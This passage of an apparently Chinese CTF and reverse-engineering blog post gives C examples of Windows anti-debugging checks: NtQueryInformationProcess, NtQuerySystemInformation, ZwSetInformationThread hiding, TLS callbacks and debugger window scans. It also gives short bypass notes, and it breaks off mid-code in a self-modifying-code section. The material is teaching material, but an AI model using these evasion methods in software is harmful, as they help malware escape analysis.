class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PROCESSINFOCLASS</span> &#123;</span></span><br><span class="line">ProcessBasicInformation = <span class="number">0</span>,</span><br><span class="line">ProcessQuotaLimits,</span><br><span class="line">ProcessIoCounters,</span><br><span class="line">ProcessVmCounters,</span><br><span class="line">ProcessTimes,</span><br><span class="line">ProcessBasePriority,</span><br><span class="line">ProcessRaisePriority,</span><br><span class="line">ProcessDebugPort = <span class="number">7</span>,</span><br><span class="line">ProcessExceptionPort,</span><br><span class="line">ProcessAccessToken,</span><br><span class="line">ProcessLdtInformation,</span><br><span class="line">ProcessLdtSize,</span><br><span class="line">ProcessDefaultHardErrorMode,</span><br><span class="line">ProcessIoPortHandlers,</span><br><span class="line">ProcessPooledUsageAndLimits,</span><br><span class="line">ProcessWorkingSetWatch,</span><br><span class="line">ProcessUserModeIOPL,</span><br><span class="line">ProcessEnableAlignmentFaultFixup,</span><br><span class="line">ProcessPriorityClass,</span><br><span class="line">ProcessWx86Information,</span><br><span class="line">ProcessHandleCount,</span><br><span class="line">ProcessAffinityMask,</span><br><span class="line">ProcessPriorityBoost,</span><br><span class="line">MaxProcessInfoClass,</span><br><span class="line">ProcessWow64Information = <span class="number">26</span>,</span><br><span class="line">ProcessImageFileName = <span class="number">27</span>,</span><br><span class="line">ProcessDebugObjectHandle = <span class="number">30</span>,</span><br><span class="line">ProcessDebugFlags = <span class="number">31</span>,</span><br><span class="line">SystemKernelDebuggerInformation = <span class="number">35</span></span><br><span class="line">&#125;PROCESSINFOCLASS;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* NTQUERYINFORMATIONPROCESS)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">PULONG ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE pProcessHandle;</span><br><span class="line">DWORD  dwDebugPort;</span><br><span class="line">HANDLE hDebugObject = <span class="literal">NULL</span>;</span><br><span class="line">BOOL bDebugFlag;</span><br><span class="line">NTQUERYINFORMATIONPROCESS myNtQueryInformationProcess;</span><br><span class="line"></span><br><span class="line">myNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">pProcessHandle = GetCurrentProcess();</span><br><span class="line">myNtQueryInformationProcess(pProcessHandle, ProcessDebugPort, &amp;dwDebugPort, <span class="keyword">sizeof</span>(dwDebugPort),<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ProcessDebugPort：%x\n&quot;</span>, dwDebugPort);</span><br><span class="line"></span><br><span class="line">myNtQueryInformationProcess(pProcessHandle, ProcessDebugObjectHandle, &amp;hDebugObject, <span class="keyword">sizeof</span>(hDebugObject), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ProcessDebugObjectHandle：%x\n&quot;</span>, hDebugObject);</span><br><span class="line"></span><br><span class="line">myNtQueryInformationProcess(pProcessHandle, ProcessDebugFlags, &amp;bDebugFlag, <span class="keyword">sizeof</span>(bDebugFlag), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ProcessDebugFlags：%x\n&quot;</span>, bDebugFlag);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//test1();</span></span><br><span class="line"><span class="comment">//test2();</span></span><br><span class="line">test3();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码是自己定义了一个函数指针，来调用NtQueryInformationProcess函数，并且枚举了更多的PROCESSINFOCLASS数据，需要注意enum类型重定义的问题，这是官方文档中没有的，应该是作者通过自己分析NtQueryInformationProcess内部得到的。</p><p>上面的3种在非调试情况返回的值分别如下</p><pre><code>ProcessDebugPort：0ProcessDebugObjectHandle：0ProcessDebugFlags：1</code></pre><p>而在调试时却是这种</p><pre><code>ProcessDebugPort：ffffffffProcessDebugObjectHandle：100 ；代表调试对象的句柄值ProcessDebugFlags：0</code></pre><p>官方文档实际上写的信息很少，如果想要深入了解如何返回的值，可以看看<a href="https://www.52pojie.cn/thread-1409104-1-1.html">https://www.52pojie.cn/thread-1409104-1-1.html</a>这篇文章，但是我一直没找到如何看这个函数内部的方法，可能和内核调试有关吧。</p><p>破解方法，修改每次的返回值就行，如果出现次数太多，或者每时每刻都在调用反调试函数，就需要用打补丁的方式hook这个api，使其每次都返回正确的值，具体思路就是在进入函数前先jmp到我们的补丁代码处，然后调用真正的NtQueryInformationProcess函数，根据栈上ProcessInformationClass[esp+c]值的不同，从而再来修改栈上ProcessInformation(esp+10)的对应值。</p><h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><p>用来检测自己的OS(操作系统)是否处于调试模式。</p><p>windows10启动调试模式和win7差不多，命令如下，需要重启电脑</p><pre><code>C:\WINDOWS\system32&gt; bcdedit /debug on ;打开C:\WINDOWS\system32&gt; bcdedit /debug off ;关闭</code></pre><p>而这个函数就可以用来判断我们的OS是否是处于调试模式。</p><p>NtQuerySystemInformation的基本信息，<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a>，官方文档还是给的不全。</p><pre><code>__kernel_entry NTSTATUS NtQuerySystemInformation(  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,  [in, out]       PVOID                    SystemInformation,  [in]            ULONG                    SystemInformationLength,  [out, optional] PULONG                   ReturnLength);</code></pre><p>主要参数一二，SystemInformationClass这个参数传入SystemKernelDebuggerInformation=0x23时，能通过其返回到第二个参数的结构体的信息来判断OS是否处于调试模式，<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/kernel_debugger.htm#:~:text=The%20SYSTEM_KERNEL_DEBUGGER_INFORMATION%20structure%20is%20what%20a%20successful%20call,buffer%20when%20given%20the%20information%20class%20SystemKernelDebuggerInformation%20%280x23%29.">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/kernel_debugger.htm#:~:text=The%20SYSTEM_KERNEL_DEBUGGER_INFORMATION%20structure%20is%20what%20a%20successful%20call,buffer%20when%20given%20the%20information%20class%20SystemKernelDebuggerInformation%20%280x23%29.</a>这个网站里面有SYSTEM_KERNEL_DEBUGGER_INFORMATION的一些信息。</p><p>测试代码如下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* NTQUERYSYSTEMINFORMATION)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">PULONG ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个结构体官方文档并没给，但能在其他地方找到这个结构体的基本信息。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_KERNEL_DEBUGGER_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">BOOLEAN DebuggerEnabled;</span><br><span class="line">BOOLEAN DebuggerNotPresent;</span><br><span class="line">&#125; SYSTEM_KERNEL_DEBUGGER_INFORMATION, * PSYSTEM_KERNEL_DEBUGGER_INFORMATION;</span><br><span class="line"></span><br><span class="line">NTQUERYSYSTEMINFORMATION myNtQuerySystemInformation;</span><br><span class="line">ULONG ulReturnedLength = <span class="number">0</span>;</span><br><span class="line">SYSTEM_KERNEL_DEBUGGER_INFORMATION SystemInformation = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">myNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">myNtQuerySystemInformation(SystemKernelDebuggerInformation, &amp;SystemInformation, <span class="keyword">sizeof</span>(SystemInformation), &amp;ulReturnedLength);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SystemKernelDebuggerInformation%d %d\n&quot;</span>, SystemInformation.DebuggerEnabled, SystemInformation.DebuggerNotPresent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SystemInformation.DebuggerEnabled)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Being Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//test1();</span></span><br><span class="line"><span class="comment">//test2();</span></span><br><span class="line"><span class="comment">//test3();</span></span><br><span class="line">test4();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当处于调试时，结构体的两个变量都是1，非调试时，结构体第一个变量为0，第二个变量为1。</p><p>破解方法，C:\WINDOWS\system32&gt; bcdedit /debug off ;关闭</p><h3 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h3><p>原理就是调试器调试进程时，会产生一个调试对象的内核对象，所以我们只需要检查这个内核对象是否存在即可。</p><p>代码太多了。。。焯</p><h3 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h3><p>该函数是用来设置线程信息的，也是一种反调试的手段，可以将被调试程序强制退出调试状态，对于ZwSetInformationThread这个函数，先看看结构。</p><pre><code>NTSYSAPI NTSTATUS ZwSetInformationThread(  [in] HANDLE          ThreadHandle,  [in] THREADINFOCLASS ThreadInformationClass,  [in] PVOID           ThreadInformation,  [in] ULONG           ThreadInformationLength);</code></pre><p>第一个参数是线程的句柄，第二个参数表示一个在THREADINFOCLASS枚举（见ntddk.h中）的系统定义的值，如下，官方文档又没给。</p><pre><code>typedef enum _THREAD_INFORMATION_CLASS &#123;        ThreadBasicInformation,        ThreadTimes,        ThreadPriority,        ThreadBasePriority,        ThreadAffinityMask,        ThreadImpersonationToken,        ThreadDescriptorTableEntry,        ThreadEnableAlignmentFaultFixup,        ThreadEventPair,        ThreadQuerySetWin32StartAddress,        ThreadZeroTlsCell,        ThreadPerformanceCount,        ThreadAmILastThread,        ThreadIdealProcessor,        ThreadPriorityBoost,        ThreadSetTlsArrayAddress,        ThreadIsIoPending,        ThreadHideFromDebugger           // 17 (0x11)    &#125; THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;</code></pre><p>当设置为ThreadHideFromDebugger，然后调用该函数，如果处于非调试状态，什么事没有，如果处于调试状态，调试器和该进程都停止。</p><p>下面还是举个例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">THREAD_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">ThreadBasicInformation,</span><br><span class="line">ThreadTimes,</span><br><span class="line">ThreadPriority,</span><br><span class="line">ThreadBasePriority,</span><br><span class="line">ThreadAffinityMask,</span><br><span class="line">ThreadImpersonationToken,</span><br><span class="line">ThreadDescriptorTableEntry,</span><br><span class="line">ThreadEnableAlignmentFaultFixup,</span><br><span class="line">ThreadEventPair,</span><br><span class="line">ThreadQuerySetWin32StartAddress,</span><br><span class="line">ThreadZeroTlsCell,</span><br><span class="line">ThreadPerformanceCount,</span><br><span class="line">ThreadAmILastThread,</span><br><span class="line">ThreadIdealProcessor,</span><br><span class="line">ThreadPriorityBoost,</span><br><span class="line">ThreadSetTlsArrayAddress,</span><br><span class="line">ThreadIsIoPending,</span><br><span class="line">ThreadHideFromDebugger           <span class="comment">// 17 (0x11)</span></span><br><span class="line">&#125; THREAD_INFORMATION_CLASS, * PTHREAD_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* ZWSETINFORMATIONTHREAD)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">THREAD_INFORMATION_CLASS ThreadInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">ULONG ThreadInformationLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">ZWSETINFORMATIONTHREAD myZwSetInformationThread;</span><br><span class="line"></span><br><span class="line">myZwSetInformationThread=(ZWSETINFORMATIONTHREAD) GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwSetInformationThread&quot;</span>);</span><br><span class="line">myZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);<span class="comment">//正常运行会跳出窗口</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test5();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida调试看看是不是真的。<br><img src="https://s2.loli.net/2022/01/10/w7i6yYna8fqexPu.png"><br>可以看到ida无法退出，程序也闪退了。</p><p>破解方法，patch掉，或者钩取该函数，修改传入的第二个参数为0。</p><h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>TLS回调函数是指，没当创建/终止进程的线程时会自动调用执行的函数，创建进程的主线程时也会自动调用回调函数，且其调用执行先于EP代码，反调试技术利用的就是TLS回调函数的这一特征。</p><p>可以先于EP执行，意味着我们可以干很多事情，搞反调试在TLS函数里面，修改全局变量数据，加密解密代码区等等事情。</p><p>下面就来举个TLS反调试的简单例子，x86，Debug下编译，release编译出来的好像有问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//linker spec通知链接器PE文件要创建TLS目录,当然32位和64位会有些差别。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCLUDE:__tls_used&quot;</span>)  </span></span><br><span class="line"><span class="comment">//函数格式</span></span><br><span class="line"><span class="comment">//typedef void (NTAPI* PIMAGE_TLS_CALLBACK)(</span></span><br><span class="line"><span class="comment">//PVOID DllHandle,</span></span><br><span class="line"><span class="comment">//DWORD Reason,</span></span><br><span class="line"><span class="comment">//PVOID Reserved</span></span><br><span class="line"><span class="comment">//);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL check;</span><br><span class="line"></span><br><span class="line">check = IsDebuggerPresent();</span><br><span class="line"><span class="keyword">if</span> (check == TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Being Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建TLS段 并定义一个回调函数。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;this is main function&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在检测到调试就会弹出被调试时窗口。</p><p>由于TLS回调函数的特性，该方法可结合各种反调试手段。</p><h3 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h3><p>简单来说就是针对各种调试器信息的，检测有没有这些调试器的痕迹出现。</p><p>常见函数，FindWindow函数看看是否有ida，xdbg等等窗口。CreateToolhelp32Snapshot()，给进程拍快照，遍历进程，看看有没有ida，xdbg的进程。包括检测虚拟机中的特殊进程之类的。</p><p>CreateToolhelp32Snapshot，ctf中就曾出现过，忘了哪个比赛了，还是比较好辨认。</p><p>vs的spy++工具可以直接查看窗口的标题和所属类名称。使用findwindows，通过提供窗口标题或者窗口所属类名来判断的方式，自己试了下不太可靠</p><p>下面举个GetWindowText查看是否存在xdbg，ida窗口的例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;locale.h&gt; //必备头文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);<span class="comment">//用来打印中文的。</span></span><br><span class="line">HWND hWnd = GetDesktopWindow();</span><br><span class="line">hWnd = GetWindow(hWnd, GW_CHILD); <span class="comment">//如果指定的窗口是父窗口，则检索到的句柄标识Z顺序顶部的子窗口；</span></span><br><span class="line">hWnd = GetWindow(hWnd, GW_HWNDFIRST);</span><br><span class="line"></span><br><span class="line">TCHAR szWindow[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="comment">//遍历所有桌面上的窗口名称来比较是否存在ida，xdbg</span></span><br><span class="line"><span class="keyword">while</span> (hWnd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (GetWindowText(hWnd, szWindow, MAX_PATH))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">_tprintf(<span class="string">L&quot;%s\n&quot;</span>, szWindow);<span class="comment">//打印窗口名称</span></span><br><span class="line"><span class="comment">//_tcsstr，字符1 在字符串2中首次出现的位置，未出现返回NULL值</span></span><br><span class="line"><span class="keyword">if</span> (_tcsstr(szWindow, <span class="string">L&quot;IDA&quot;</span>) ||</span><br><span class="line">_tcsstr(szWindow, <span class="string">L&quot;dbg&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Being Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hWnd = GetWindow(hWnd, GW_HWNDNEXT);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用findwindows有点不准确。</p><p>破解方法，绕过就行。</p><h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><p>这个技术就是将代码区给加密或部分加密，在调试的时候进行自解密，就不会对程序产生影响，而带来的效果是ida静态分析时看不到相应代码部分，利用汇编，或者c语言都可实现，可配合TLS回调函数进行，在ep前进行main函数的自解密。</p><p>先讲讲汇编实现的原理，实际上和21章内嵌补丁练习差不多，本次安洵出题也是这样实现的，编译好程序exe后，先指定好需要加密的部分，用idapython进行加密，选定一个这个代码部分前一个要跳转的部分(jmp指令之类的)，修改跳转地址，改到一个空白区，当然空白区部分的权限需要修改为RWE(读写执行)，然后编写汇编代码进行自解密，解密完成后再跳转到原应跳转的位置。例子可以去看安洵的那个题。</p><p>下面讲讲如何用c语言代码实现。</p><p>环境配置，release，x86，优化关闭，数据执行保护(DEP)关闭，随机基地关闭。</p><p>下面讲为什么需要设置这些，优化关闭可以直接定位到函数地址，不关闭的话会进入函数会有一个jmp 然后再跳到函数地址，简单来说就是优化时，函数所代表的地址不是函数真正的地址。数据执行保护关闭可以让你直接修改函数代码的二进制。随机地址关闭可以让你每次加载的基地址一致。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 